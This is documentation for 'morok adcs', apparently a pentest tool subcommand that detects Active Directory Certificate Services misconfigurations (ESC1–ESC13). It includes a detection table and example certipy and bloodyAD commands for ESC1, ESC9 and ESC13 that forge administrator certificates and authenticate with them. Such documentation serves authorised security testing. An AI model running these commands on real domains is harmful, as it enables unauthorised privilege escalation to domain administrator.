# morok adcs

Analyzes Active Directory Certificate Services for ESC1–ESC9, ESC11, and ESC13 vulnerabilities.

## Usage

```bash
morok adcs -d <domain> -u <user> -p <pass> --dc <dc>
```

## Detected vulnerabilities

| ESC | Name | Condition | Severity |
|-----|------|-----------|----------|
| ESC1 | Enrollee supplies SAN | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + auth EKU + low-priv enrollment | Critical |
| ESC2 | Any purpose | `Any Purpose` EKU or no EKUs | High |
| ESC3 | Enrollment agent | `Certificate Request Agent` EKU + `msPKI-RA-Signature == 0` | High |
| ESC4 | Template write access | Low-priv has WriteDACL/WriteOwner/GenericAll/GenericWrite on template | High |
| ESC6 | EDITF flag on CA | `EDITF_ATTRIBUTESUBJECTALTNAME2` set on CA — any template allows SAN | Critical |
| ESC7 | CA officer abuse | Low-priv has ManageCA or ManageCertificates on CA object | Critical/High |
| ESC8 | Web enrollment | AD CS web enrollment HTTP endpoint accessible (manual verify) | High |
| ESC9 | No security extension | `CT_FLAG_NO_SECURITY_EXTENSION` (0x00080000) in `msPKI-Enrollment-Flag` — cert has no SID binding | Medium |
| ESC11 | ICPR/DCOM relay | Legacy RPC certificate enrollment relay (manual verify) | High |
| ESC13 | Policy OID → group | Issuance policy OID has `msDS-OIDToGroupLink` to privileged group; low-priv can enroll | Critical/High |

> ESC5 (PKI object ACL abuse) and ESC10 (weak certificate mapping via registry) are not detected automatically — they require manual analysis or DC registry access.

## Output includes

- CA table (name, DNS hostname, ESC6 flag indicator)
- Per-template findings with enrollment rights and EKUs
- ESC13: linked group DN shown in finding
- certipy / bloodyAD exploit commands per ESC type

## Example

```bash
morok adcs -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

```bash
# ESC1 exploit (certipy)
certipy req -u jdoe@corp.local -p 'Password1' -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# ESC9 exploit (requires GenericWrite over victim account)
bloodyAD -u jdoe -p 'Password1' -d corp.local \
  set object victim userPrincipalName administrator@corp.local
certipy req -u victim@corp.local -p 'victimpass' -ca 'CORP-CA' -template 'VulnTemplate'
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# ESC13 exploit
certipy req -u jdoe@corp.local -p 'Password1' -ca 'CORP-CA' -template 'PolicyTemplate'
certipy auth -pfx jdoe.pfx -dc-ip 10.0.0.1
```

## Flags

All standard connection flags apply — see [Authentication](../getting-started/auth.md).
